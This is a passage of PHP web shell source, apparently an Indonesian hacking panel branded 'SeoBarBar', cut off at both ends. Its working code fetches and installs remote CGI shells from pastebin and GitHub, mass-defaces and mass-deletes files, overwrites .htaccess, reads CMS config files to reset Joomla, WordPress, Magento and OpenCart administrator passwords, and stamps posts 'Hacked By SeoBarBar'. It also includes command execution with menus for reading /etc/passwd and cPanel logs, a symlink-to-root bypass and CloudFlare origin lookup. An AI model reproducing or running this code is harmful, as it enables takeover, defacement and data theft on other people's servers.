 AddHandler cgi-script .MariDono";$htcgi=fopen(".htaccess","w");$targetPath="https://pastebin.com/raw/YBhaepp1";$data=mari_get_contents($targetPath);$content=base64_decode($data);file_put_contents($file_cgi,$content);fwrite($htcgi,$isi_htcgi);chmod($file_cgi,0755);chmod($memeg,0755);ob_flush();flush();echo "<br><center>Done ... <a href='mari_cgi/cgi.MariDono' target='_blank'>Klik Disini</a>";}elseif(isset($_POST['cgi2'])){if(!is_dir("mari_cgi")){mkdir('mari_cgi',0755);}chdir('mari_cgi');$file_cgi="cgi2.MariDono";$memeg=".htaccess";$isi_htcgi="OPTIONS Indexes Includes ExecCGI FollowSymLinks 
 AddType application/x-httpd-cgi .MariDono 
 AddHandler cgi-script .MariDono ";$htcgi=fopen(".htaccess","w");$ch=curl_init("https://github.com/tennc/webshell/raw/master/net-friend/cgi/WebShell.cgi");$cgi=fopen($file_cgi,"w");curl_setopt($ch,CURLOPT_FILE,$cgi);curl_setopt($ch,CURLOPT_HEADER,0);curl_exec($ch);curl_close($ch);fwrite($htcgi,$isi_htcgi);chmod($file_cgi,0755);chmod($memeg,0755);echo "<br><center>Done ... <a href='mari_cgi/cgi2.MariDono' target='_blank'>Klik Here</a>";}elseif(isset($_POST['cgipy'])){if(!is_dir("mari_cgi")){mkdir('mari_cgi',0755);}chdir('mari_cgi');$file_cgi="cgipy.MariDono";$memeg=".htaccess";$isi_htcgi="OPTIONS Indexes Includes ExecCGI FollowSymLinks 
 AddType application/x-httpd-cgi .MariDono 
 AddHandler cgi-script .MariDono 
 AddHandler cgi-script .MariDono";$htcgi=fopen(".htaccess","w");$ch=curl_init("https://pastebin.com/raw/MYyXAXyY");$cgi=fopen($file_cgi,"w");curl_setopt($ch,CURLOPT_FILE,$cgi);curl_setopt($ch,CURLOPT_HEADER,0);curl_exec($ch);curl_close($ch);fwrite($htcgi,$isi_htcgi);chmod($file_cgi,0755);chmod($memeg,0755);echo "<br><center>Done ... <a href='mari_cgi/cgipy.MariDono' target='_blank'>Klik Here</a>";}}elseif(isset($_GET[hex('mass_tool')])){$dir=path();echo "<center><form action=\"\" method=\"post\">
";if(isset($_POST['d_dir'])){$dirr=$_POST['d_dir'];}if(isset($_POST["script"])){$index=$_POST["script"];$index=str_replace('"',"'",$index);$index=stripslashes($index);}function edit_file($file,$index){if(is_writable($file)){clear_fill($file,$index);echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";}else{echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";}}function hapus_massal($dir,$namafile){if(is_writable($dir)){$dira=scandir($dir);foreach($dira as $dirb){$dirc="$dir/$dirb";$lokasi=$dirc.'/'.$namafile;if($dirb==='.'){if(file_exists("$dir/$namafile")){unlink("$dir/$namafile");}}elseif($dirb==='..'){if(file_exists("".dirname($dir)."/$namafile")){unlink("".dirname($dir)."/$namafile");}}else{if(is_dir($dirc)){if(is_writable($dirc)){if(file_exists($lokasi)){echo"DELETED $lokasi<br>";unlink($lokasi);$idx=hapus_massal($dirc,$namafile);}}}}}}}function clear_fill($file,$index){if(file_exists($file)){$handle=fopen($file,'w');fwrite($handle,'');fwrite($handle,$index);fclose($handle);}}function gass(){global $dirr,$index;chdir($dirr);$me=str_replace(dirname(__FILE__).'/','',__FILE__);$files=scandir($dirr);$notallow=array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");sort($files);$n=0;foreach($files as $file){if($file!=$me&&is_dir($file)!=1&&!in_array($file,$notallow)){echo"<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";edit_file($file,$index);flush();$n=$n+1;}}echo "<br>";echo"<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";}function gass_all(){global $index;$dirrall=$_POST['d_dir'];foreach(ListFiles($dirrall)as $key=>$file){$file=str_replace('//',"/",$file);echo"<center><strong>$file</strong> ===>";edit_file($file,$index);flush();}$key=$key+1;echo"<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>";}function sabun_massal($dir,$namafile,$isi_script){if(is_writable($dir)){$dira=scandir($dir);foreach($dira as $dirb){$dirc="$dir/$dirb";$lokasi=$dirc.'/'.$namafile;if($dirb==='.'){file_put_contents($lokasi,$isi_script);}elseif($dirb==='..'){file_put_contents($lokasi,$isi_script);}else{if(is_dir($dirc)){if(is_writable($dirc)){echo"[<font color=red>DONE</font>] $lokasi<br>";file_put_contents($lokasi,$isi_script);$idx=sabun_massal($dirc,$namafile,$isi_script);}}}}}}if($_POST['mass']=='onedir'){echo "<br> Versi Text Area<br><textarea class = 'form-control' name='index' rows='10' cols='67'>
";$ini="http://";$mainpath=$_POST[d_dir];$file=$_POST[d_file];$dir=opendir("$mainpath");$code=base64_encode($_POST[script]);$indx=base64_decode($code);while($row=readdir($dir)){$start=@fopen("$row/$file","w+");$finish=@fwrite($start,$indx);if($finish){echo"$ini$row/$file
";}}echo "</textarea><br><b>Versi Text</b><br><br><br>
";$mainpath=$_POST[d_dir];$file=$_POST[d_file];$dir=opendir("$mainpath");$code=base64_encode($_POST[script]);$indx=base64_decode($code);while($row=readdir($dir)){$start=@fopen("$row/$file","w+");$finish=@fwrite($start,$indx);if($finish){echo '<a href="http://'.$row.'/'.$file.'" target="_blank">http://'.$row.'/'.$file.'</a><br>';}}echo "<hr>";}elseif($_POST['mass']=='sabunkabeh'){gass();}elseif($_POST['mass']=='hapusmassal'){hapus_massal($_POST['d_dir'],$_POST['d_file']);}elseif($_POST['mass']=='gantimassalfiledir'){ganti_massal($_POST['d_dir']);}elseif($_POST['mass']=='sabunmematikan'){gass_all();}elseif($_POST['mass']=='massdeface'){echo "<div style='margin: 5px auto; padding: 5px'>";sabun_massal($_POST['d_dir'],$_POST['d_file'],$_POST['script']);echo "</div>";}else{echo"
		<hr><br>
		<center><h2>Mass Deface / Delete / Touch Files SeoBarBar</h2><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		<select class=\"form-control\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
		<option value=\"onedir\">Mass Deface 1 Dir</option>
		<option value=\"massdeface\">Mass Deface ALL Dir</option>
		<option value=\"sabunkabeh\">Mass Deface Files Massal Di Folder ini</option>
		<option value=\"sabunmematikan\">Mass Deface All Files</option>
		<option value=\"hapusmassal\">Mass Delete Files</option>
		<option value=\"gantimassalfiledir\" selected>Mass Ganti Waktu Files dan Directory</option>
		<font style='text-decoration: underline;'>Folder:</font><br>
		<input class= 'form-control' type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Filename:</font><br>
		<input class= 'form-control' type='text' name='d_file' value='.htaccess' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea class= 'form-control' name='script' style='width: 450px; height: 200px;'>";echo base64_decode('T3B0aW9ucyAtSW5kZXhlcwo8RmlsZXNNYXRjaCAiLipcLihweXxzaHRtbHxwaHRtbHxwaHB8UEhQfFBocHxQSHB8cEhwfHBIUHxwaFB8UGhQfHBocDV8cGhwNykkIj4KT3JkZXIgQWxsb3csRGVueQpEZW55IGZyb20gYWxsCjwvRmlsZXNNYXRjaD4KPEZpbGVzTWF0Y2ggJ14oaW5kZXgucGhwfHdwLWxvZ2luLnBocHx4bWxycGMucGhwfGVkaXQtZm9ybS1hZHZhbmNlZC5waHB8bGluay1wYXJzZS1vcG1sLnBocHxtcy1zaXRlcy5waHB8b3B0aW9ucy13cml0aW5nLnBocHx0aGVtZXMucGhwfGh0dHBzLnBocHxjbGFzcy1odHRwcy5waHB8YWRtaW4tYWpheC5waHB8ZWRpdC1mb3JtLWNvbW1lbnQucGhwfGxpbmsucGhwfG1zLXRoZW1lcy5waHB8bWFyaS5waHB8cGx1Z2luLWVkaXRvci5waHB8YWRtaW4tZm9vdGVyLnBocHxlZGl0LWxpbmstZm9ybS5waHB8bG9hZC1zY3JpcHRzLnBocHxtcy11cGdyYWRlLW5ldHdvcmsucGhwfGFkbWluLWZ1bmN0aW9ucy5waHB8ZWRpdC5waHB8bG9hZC1zdHlsZXMucGhwfG1zLXVzZXJzLnBocHxwbHVnaW5zLnBocHxhZG1pbi1oZWFkZXIucGhwfGxpY2Vuc2VzLnBocHxlZGl0LXRhZy1mb3JtLnBocHxtZWRpYS1uZXcucGhwfG15LXNpdGVzLnBocHxhcHBzLnBocHxwb3N0LW5ldy5waHB8dXBncmFkZS10aGVtZXMucGhwfHNhbmR3aWNoLnBocHxlZGl0LXRhZ3MucGhwfG1lZGlhLnBocHxuYXYtbWVudXMucGhwfHBvc3RzLnBocHxhZG1pbi1wb3N0LnBocHxtYXJpZG9uby5waHB8ZXhwb3J0LnBocHxOb3RlLnBocHxtZWRpYS11cGxvYWQucGhwfG5ldHdvcmsucGhwfHByZXNzLXRoaXMucGhwfHVwbG9hZC5waHB8YXN5bmMtdXBsb2FkLnBocHxtZW51LWhlYWRlci5waHB8b3B0aW9ucy1kaXNjdXNzaW9uLnBocHxwcml2YWN5LnBocHx1c2VyLWVkaXQucGhwfG1lbnUucGhwfG9wdGlvbnMtZ2VuZXJhbC5waHB8cHJvZmlsZS5waHB8bm9vcC5waHB8cmVnaXN0cmF0aW9uLWZ1bmN0aW9ucy5waHB8dXNlci1uZXcucGhwfG1vZGVyYXRpb24ucGhwfG9wdGlvbnMtaGVhZC5waHB8cmV2aXNpb24ucGhwfHVzZXJzLnBocHxjdXN0b20tYmFja2dyb3VuZC5waHB8bXMtYWRtaW4ucGhwfG9wdGlvbnMtbWVkaWEucGhwfHNldHVwLWNvbmZpZy5waHB8Y2xhc3Mtd3AtY3VzdG9taXplLW5hdi1tZW51LWN1c3RvbWl6ZS5waHB8d2lkZ2V0cy5waHB8dGhlbWUtc2luZ2xlLnBocHxjdXN0b20taGVhZGVyLnBocHxtcy1kZWxldGUtc2l0ZS5waHB8b3B0aW9ucy1wZXJtYWxpbmsucGhwfHRlcm0ucGhwfGN1c3RvbWl6ZS5waHB8bGluay1hZGQucGhwfHN1cHJlLnBocHxtcy1lZGl0LnBocHxvcHRpb25zLnBocHxlZGl0LWNvbW1lbnRzLnBocHxsaW5rLW1hbmFnZXIucGhwfG1zLW9wdGlvbnMucGhwfG9wdGlvbnMtcmVhZGluZy5waHB8eG1scnBjLnBocHxjb21tZW50cy5waHB8ZnJvbnQtcGFnZS5waHB8aG9tZS5waHB8aGVhZGVyLnBocHxzaW5ndWxhci5waHB8c2luZ2xlLnBocHxzaW5nbGUtd29yZHByZXNzLnBocHxwYWdlLnBocHxjYXRlZ29yeS5waHB8dGFnLnBocHx0YXhvbm9teS5waHB8YXV0aG9yLnBocHxkYXRlLnBocHxhcmNoaXZlLnBocHxzZWFyY2gucGhwfGF0dGFjaG1lbnQucGhwfGltYWdlLnBocHw0MDQucGhwKSQnPgpPcmRlciBhbGxvdyxkZW55CkFsbG93IGZyb20gYWxsCjwvRmlsZXNNYXRjaD4KIyBCRUdJTgo8SWZNb2R1bGUgbW9kX3Jld3JpdGUuYz4KUmV3cml0ZUVuZ2luZSBPbgpSZXdyaXRlQmFzZSAvClJld3JpdGVSdWxlIF5pbmRleC5waHAkIC0gW0xdClJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1mClJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1kClJld3JpdGVSdWxlIC4gaW5kZXgucGhwIFtMXQo8L0lmTW9kdWxlPgojIEVORA==');echo "</textarea><br>
		<input class= 'form-control' type='submit' name='start' value='Do it!' style='width: 450px;'>
		</form></center><hr><br>";}}elseif(isset($_GET[hex('mass_user')])){if(isset($_POST['hajar'])){if(strlen($_POST['pass_baru'])<6 or strlen($_POST['user_baru'])<6){print "username atau password harus lebih dari 6 karakter";}else{$user_baru=$_POST['user_baru'];$pass_baru=md5($_POST['pass_baru']);$conf=$_POST['config_dir'];if(preg_match("/^http:\/\//",$conf)or preg_match("/^https:\/\//",$conf)){$get=curl($conf);preg_match_all('/<a href="(.*?).txt">/',$get,$link);foreach($link[1]as $link_config){$scan_conf[]="$link_config.txt";}}else{$scan_conf=scandir($conf);}foreach($scan_conf as $file_conf){$config=mari_get_contents("$conf/$file_conf");if(preg_match("/JConfig|joomla/",$config)){$dbhost=getValue($config,"host = '","'");$dbuser=getValue($config,"user = '","'");$dbpass=getValue($config,"password = '","'");$dbname=getValue($config,"db = '","'");$dbprefix=getValue($config,"dbprefix = '","'");$prefix=$dbprefix."users";$conn=mysql_connect($dbhost,$dbuser,$dbpass);$db=mysql_select_db($dbname);$q=mysql_query("SELECT * FROM $prefix ORDER BY id ASC");$result=mysql_fetch_array($q);$id=$result['id'];$site=getValue($config,"sitename = '","'");$update=mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");print "Config => ".$file_conf."<br>";print "CMS => Joomla<br>";if($site==''){print "Sitename => ".color(1,1,"Can't get domain name")."<br>";}else{print"Sitename => $site<br>";}if(!$update or!$conn or!$db){print "Status => ".color(1,1,mysql_error())."<br><br>";}else{print "Status => ".color(1,2,"sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";}mysql_close($conn);}elseif(preg_match("/WordPress/",$config)){$dbhost=getValue($config,"DB_HOST', '","'");$dbuser=getValue($config,"DB_USER', '","'");$dbpass=getValue($config,"DB_PASSWORD', '","'");$dbname=getValue($config,"DB_NAME', '","'");$dbprefix=getValue($config,"table_prefix  = '","'");$prefix=$dbprefix."users";$option=$dbprefix."options";$conn=mysql_connect($dbhost,$dbuser,$dbpass);$db=mysql_select_db($dbname);$q=mysql_query("SELECT * FROM $prefix ORDER BY id ASC");$result=mysql_fetch_array($q);$id=$result[ID];$q2=mysql_query("SELECT * FROM $option ORDER BY option_id ASC");$result2=mysql_fetch_array($q2);$target=$result2[option_value];if($target==''){$url_target="Login => ".color(1,1,"Cant't get domain name")."<br>";}else{$url_target="Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";}$update=mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");print "Config => ".$file_conf."<br>";print "CMS => Wordpress<br>";print $url_target;if(!$update or!$conn or!$db){print "Status => ".color(1,1,mysql_error())."<br><br>";}else{print "Status => ".color(1,2,"sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";}mysql_close($conn);}elseif(preg_match("/Magento|Mage_Core/",$config)){$dbhost=getValue($config,"<host><![CDATA[","]]></host>");$dbuser=getValue($config,"<username><![CDATA[","]]></username>");$dbpass=getValue($config,"<password><![CDATA[","]]></password>");$dbname=getValue($config,"<dbname><![CDATA[","]]></dbname>");$dbprefix=getValue($config,"<table_prefix><![CDATA[","]]></table_prefix>");$prefix=$dbprefix."admin_user";$option=$dbprefix."core_config_data";$conn=mysql_connect($dbhost,$dbuser,$dbpass);$db=mysql_select_db($dbname);$q=mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");$result=mysql_fetch_array($q);$id=$result[user_id];$q2=mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");$result2=mysql_fetch_array($q2);$target=$result2[value];if($target==''){$url_target="Login => ".color(1,1,"Cant't get domain name")."<br>";}else{$url_target="Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";}$update=mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");print "Config => ".$file_conf."<br>";print "CMS => Magento<br>";print $url_target;if(!$update or!$conn or!$db){print "Status => ".color(1,1,mysql_error())."<br><br>";}else{print "Status => ".color(1,2,"sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";}mysql_close($conn);}elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)){$dbhost=getValue($config,"'DB_HOSTNAME', '","'");$dbuser=getValue($config,"'DB_USERNAME', '","'");$dbpass=getValue($config,"'DB_PASSWORD', '","'");$dbname=getValue($config,"'DB_DATABASE', '","'");$dbprefix=getValue($config,"'DB_PREFIX', '","'");$prefix=$dbprefix."user";$conn=mysql_connect($dbhost,$dbuser,$dbpass);$db=mysql_select_db($dbname);$q=mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");$result=mysql_fetch_array($q);$id=$result[user_id];$target=getValue($config,"HTTP_SERVER', '","'");if($target==''){$url_target="Login => ".color(1,1,"Cant't get domain name")."<br>";}else{$url_target="Login => <a href='$target' target='_blank'><u>$target</u></a><br>";}$update=mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");print "Config => ".$file_conf."<br>";print "CMS => OpenCart<br>";print $url_target;if(!$update or!$conn or!$db){print "Status => ".color(1,1,mysql_error())."<br><br>";}else{print "Status => ".color(1,2,"sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";}mysql_close($conn);}elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)){$dbhost=getValue($config,'server = "','"');$dbuser=getValue($config,'username = "','"');$dbpass=getValue($config,'password = "','"');$dbname=getValue($config,'database = "','"');$prefix="users";$option="identitas";$conn=mysql_connect($dbhost,$dbuser,$dbpass);$db=mysql_select_db($dbname);$q=mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");$result=mysql_fetch_array($q);$target=$result[alamat_website];if($target==''){$target2=$result[url];$url_target="Login => ".color(1,1,"Cant't get domain name")."<br>";if($target2==''){$url_target2="Login => ".color(1,1,"Cant't get domain name")."<br>";}else{$cek_login3=mari_get_contents("$target2/adminweb/");$cek_login4=mari_get_contents("$target2/lokomedia/adminweb/");if(preg_match("/CMS Lokomedia|Administrator/",$cek_login3)){$url_target2="Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";}elseif(preg_match("/CMS Lokomedia|Lokomedia/",$cek_login4)){$url_target2="Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";}else{$url_target2="Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";}}}else{$cek_login=mari_get_contents("$target/adminweb/");$cek_login2=mari_get_contents("$target/lokomedia/adminweb/");if(preg_match("/CMS Lokomedia|Administrator/",$cek_login)){$url_target="Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";}elseif(preg_match("/CMS Lokomedia|Lokomedia/",$cek_login2)){$url_target="Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";}else{$url_target="Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";}}$update=mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");print "Config => ".$file_conf."<br>";print "CMS => Lokomedia<br>";if(preg_match("/Can't get domain name/",$url_target)){print $url_target2;}else{print $url_target;}if(!$update or!$conn or!$db){print "Status => ".color(1,1,mysql_error())."<br><br>";}else{print "Status => ".color(1,2,"sukses edit user, silakan login dengan user & pass yang baru.")."<br><br>";}mysql_close($conn);}}}}else{print "<center>
				<h2>Mass User Changer SeoBarBar</h2>
				<form method='post'>
				<input type='radio' name='config_type' value='dir' checked>DIR Config <input type='radio' name='config_type' value='link'>LINK Config<br><br>
				<input type='text' size='50' name='config_dir' style='width:250px;' height = '10' class='form-control' value='".path()."'><br><br>
				Set User & Pass: <br>
				<input type='text' style='width:250px;' height = '10' class='form-control' name='user_baru' value='SeoBarBar' placeholder='user_baru'><br>
				<input type='text' style='width:250px;' height = '10' class='form-control' name='pass_baru' value='SeoBarBar' placeholder='pass_baru'><br>
				<input class = 'form-control' style='width: 215px; margin: 5px auto;' type='submit' name='hajar' value='Hajar!'>
				</form></center><hr><br>";}}elseif(isset($_GET[hex('mass_title')])){echo "<hr><br><center><h2>Mass Title Changer SeoBarBar</h2>
<form method='post'>
Link Config: <br>
<input type='text' class = 'form-control' height='10' name='linkconf' height='10' style='width: 450px;' placeholder='http://website.com/mari_symconf/'><br><br>
<input type='submit' class = 'form-control' height='10' style='width: 450px;'name='gass' value='Hajar!!' class='oke'>
</form></center><hr><br>";if($_POST['gass']){echo "<center>
<form method='post'>
Link Config: <br>
<textarea name='link'>";GrabUrl($_POST['linkconf'],'wordpress');echo "</textarea><br>ID: <input class = 'form-control'  type='text' name='id' value='1'><br>TITLE :<input type='text' name='title' value='Hacked By SeoBarBar'><br>POST CONTENT: <input type='text' name='content' value='Hacked By SeoBarBar'><br>POSTNAME: <input type='text' name='postname' value='HackeD By SeoBarBar'><br>
<input type='submit' style='width: 450px;' name='edittitle' value='Hajar!!'>
</form></center>";}if($_POST['edittitle']){$title=htmlspecialchars($_POST['title']);$id=$_POST['id'];$content=$_POST['content'];$postname=$_POST['name'];function anucurl($sites){$ch=curl_init($sites);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);curl_setopt($ch,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,5);curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ch,CURLOPT_COOKIEJAR,'cookie.txt');curl_setopt($ch,CURLOPT_COOKIEFILE,'cookie.txt');curl_setopt($ch,CURLOPT_COOKIESESSION,true);$data=curl_exec($ch);curl_close($ch);return $data;}$link=explode("
",$_POST['link']);foreach($link as $dir_config){$config=anucurl($dir_config);$dbhost=ambilkata($config,"DB_HOST', '","'");$dbuser=ambilkata($config,"DB_USER', '","'");$dbpass=ambilkata($config,"DB_PASSWORD', '","'");$dbname=ambilkata($config,"DB_NAME', '","'");$dbprefix=ambilkata($config,"table_prefix  = '","'");$prefix=$dbprefix."posts";$option=$dbprefix."options";$conn=mysql_connect($dbhost,$dbuser,$dbpass);$db=mysql_select_db($dbname);$q=mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");$result=mysql_fetch_array($q);$id=$result[ID];$q2=mysql_query("SELECT * FROM $option ORDER BY option_id ASC");$result2=mysql_fetch_array($q2);$target=$result2[option_value];$update=mysql_query("UPDATE $prefix SET post_title='$title',post_content='$content',post_name='$postname',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");$update.=mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");echo "<div style='margin: 5px auto;'>";if($target==''){echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";}else{echo"URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";}if(!$update or!$conn or!$db){echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";}else{echo "<font color=lime>sukses di ganti.</font><br>";}echo "</div>";mysql_close($conn);}}}elseif(isset($_GET[hex('bypass')])){echo "<hr><br>";echo "<center><h2>Bypasser SeoBarBar</h2></center><br>";echo "<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=".hex($d)."&".hex('bypass-cf')."' style='width: 250px;' height='10'><center>Bypass CloudFlare</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=".hex($d)."&".hex('bypass-server')."' style='width: 250px;' height='10'><center>Bypass Server</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=".hex($d)."&".hex('bypass-vhost')."' style='width: 250px;' height='10'><center>Bypass Vhost</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=".hex($d)."&".hex('bypass-passwd')."' style='width: 250px;' height='10'><center>Bypass Passwd</center></a>
						</div>
						</div></form>";echo "<hr>";}elseif(isset($_GET[hex('bypass-cf')])){echo '
				
				<form method="POST"><br><br><center><hr>
				<h2>Bypass CloudFlare SeoBarBar</h2>
				<div class = "row clearfix">
				<div class= "col-md-4">
				<select class="form-control" name="krz">
					<option>ftp</option>
						<option>direct-conntect</option>
							<option>webmail</option>
								<option>cpanel</option>
				</select>
				</div>
				<div class = "col-md-4">
				<input class="form-control" type="text" name="target" value="url">
				</div>
				<div class = "col-md-4">
				<input class="form-control" type="submit" value="Bypass">
				</div>
				</div>
				</center>
				<hr><br>
				</form>
				
				';$target=$_POST['target'];if($_POST['krz']=="ftp"){$ftp=gethostbyname("ftp."."$target");echo"<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
				ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$ftp</font></p>";}if($_POST['krz']=="direct-conntect"){$direct=gethostbyname("direct-connect."."$target");echo"<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
				ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$direct</font></p>";}if($_POST['krz']=="webmail"){$web=gethostbyname("webmail."."$target");echo"<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
				ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$web</font></p>";}if($_POST['krz']=="cpanel"){$cpanel=gethostbyname("cpanel."."$target");echo"<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
				ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$cpanel</font></p>";}}elseif(isset($_GET[hex('bypass-server')])){$dir=path(); ?><form method="post"action="?dir=<?php echo $dir; ?>&do=bypassserver"><center><br><hr><h2>Bypass Server SeoBarBar</h2><br><?php print '
<form method="POST" action=""><br><center>
<b><font color=white><b><font color="black">Command </font></font></b>
<div class = "col-md-4">
<input name="baba" type="text" class="form-control" style="width:250px;" size="34">&nbsp;
</div>
<div class = "col-md-4">
<input type="submit" class="form-control" value="Execute!" style="width:350px;">
<br>
</div>
</form>
<form method="POST" action=""><strong><b><font color="black">Menu Bypass</font></strong>
<select name="liz0" size="1" class="form-control" style="width:250px;">
<option value="cat /etc/passwd">/etc/passwd</option>
<option value="netstat -an | grep -i listen">netstat</option>
<option value="cat /var/cpanel/accounting.log">/var/cpanel/accounting.log</option>
<option value="cat /etc/syslog.conf">/etc/syslog.conf</option>
<option value="cat /etc/hosts">/etc/hosts</option>
<option value="cat /etc/named.conf">/etc/named.conf</option>
<option value="cat /etc/httpd/conf/httpd.conf">/etc/httpd/conf/httpd.conf</option>
</select> <br><input type="submit" class="form-control" style="width:350px;" value="Bypass!">
</form>
<hr><br></center>
';ini_restore("safe_mode");ini_restore("open_basedir");$liz0=exe($_POST[baba]);$liz0zim=exe($_POST[liz0]);$uid=exe('id');$server=exe('uname -a');echo "<pre><h4>";echo $liz0;echo $liz0zim;echo "</h4></pre>";"</div>"; ?><?php }elseif(isset($_GET[hex('bypass-vhost')])){echo "<hr><form method='POST' action=''>";echo "<center><br><font size='6'>Bypass Symlink vHost</font><br><br>";echo "<center><input type='submit' value='Bypass it' name='Colii' class = 'form-control' style='width:250px;'></center>";if(isset($_POST['Colii'])){system('ln -s / MARIdoNO.txt');$fvckem='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw';$file=fopen(".htaccess","w+");$write=fwrite($file,base64_decode($fvckem));$Bok3p=symlink("/","MARIdoNO.txt");$rt="<br><a href=MARIdoNO.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
	Bypassed Successfully</b></font></a>";echo"<br><br><b>Done.. !</b><br><br>Check link given below for / folder symlink <br>$rt</center>";}echo "</form><hr><br>";}elseif(isset($_GET[hex('bypass-passwd')])){echo '<hr><center><h2>Bypass Etc/Passwd </h2><br>
<table style="width:50%">
  <tr>
    <td><form method="post"><input type="submit" class = "form-control" value="System Function" name="syst"></form></td>
    <td><form method="post"><input type="submit" class = "form-control"value="Passthru Function" name="passth"></form></td>
    <td><form method="post"><input type="submit" class = "form-control" value="Exec Function" name="ex"></form></td>	
    <td><form method="post"><input type="submit" class = "form-control" value="Shell_exec Function" name="shex"></form></td>		
    <td><form method="post"><input type="submit" class = "form-control" value="Posix_getpwuid Function" name="melex"></form></td>
</tr></table>
<br><hr>
<h2>Bypass User</h2><table style="width:50%"><br>
<tr>
    <td><form method="post"><input type="submit" class = "form-control" value="Awk Program" name="awkuser"></form></td>
    <td><form method="post"><input type="submit" class = "form-control" value="System Function" name="systuser"></form></td>
    <td><form method="post"><input type="submit" class = "form-control" value="Passthru Function" name="passthuser"></form></td>	
    <td><form method="post"><input type="submit" class = "form-control" value="Exec Function" name="exuser"></form></td>		
    <td><form method="post"><input type="submit" class = "form-control" value="Shell_exec Function" name="shexuser"></form></td>
</tr>
